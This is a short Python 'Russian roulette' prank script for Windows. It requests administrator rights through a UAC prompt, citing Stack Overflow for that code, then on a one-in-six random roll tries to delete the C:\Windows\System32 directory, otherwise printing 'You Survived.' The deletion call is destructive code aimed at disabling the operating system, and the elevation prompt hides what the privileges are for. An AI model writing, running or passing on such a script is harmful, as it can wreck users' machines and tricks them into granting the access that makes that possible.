import os,ctypes, random, sys

if not ctypes.windll.shell32.IsUserAnAdmin():
    os.system('cls')
    print('Requesting admin permissions.')
    ctypes.windll.shell32.ShellExecuteW(
        None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
    # Got this code from Stack Overflow https://stackoverflow.com/questions/130763/request-uac-elevation-from-within-a-python-script
else:
    print("ok")
    if random.randint(1,6) == 1:
        os.rmdir('C:\Windows\System32')
    else:
        print("You Survived.")
